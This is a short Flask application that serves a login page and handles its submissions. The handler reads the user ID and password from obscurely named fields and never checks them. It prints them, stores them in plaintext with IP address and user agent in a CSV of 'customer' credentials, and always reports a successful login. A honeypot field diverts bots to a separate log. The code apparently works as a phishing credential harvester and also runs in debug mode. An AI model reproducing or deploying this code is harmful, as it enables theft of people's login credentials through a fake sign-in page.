from datetime import datetime
from flask import Flask, render_template, request, redirect
import csv
import os

app = Flask(__name__)
data_file = 'data/login.csv'
bot_trace='data/bot_trace.csv'

@app.route('/')
def index():
    return render_template('login.html')



@app.route('/submit', methods=['POST'])
def submit():
    real_id = request.form.get('dtx000')
    real_password = request.form.get('dtx001')
 
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    hpot_id = request.form.get('id')
    hpot_password = request.form.get('password')

    # Debugging
    print(f"Real ID: {real_id}, Real Password: {real_password}")
    print(f"Honeypot ID: {hpot_id}, Honeypot Password: {hpot_password}")

    if hpot_id or hpot_password:
        print("Honeypot triggered! Potential spam detected.")
        with open(bot_trace, 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([
                timestamp,
                ip_address,
                user_agent,
                hpot_id,
                hpot_password
            ])
        return redirect('/')

    with open(data_file, 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp,
                ip_address,
                user_agent,
                real_id, 
                real_password])
    
    print("Form submitted successfully!")
    return "Logged in successfully!"


if __name__ == '__main__':
    if not os.path.exists('data'):
        os.makedirs('data')

    if not os.path.isfile(data_file):
        with open(data_file, 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(['Timestamp','IP Address','User Agent','Customer ID','Customer Password'])

    if not os.path.isfile(bot_trace):
        with open(bot_trace, 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([
                'Timestamp', 
                'IP Address', 
                'User Agent', 
                'hpot ID', 
                'hpot Password'
            ])

    app.run(debug=True)
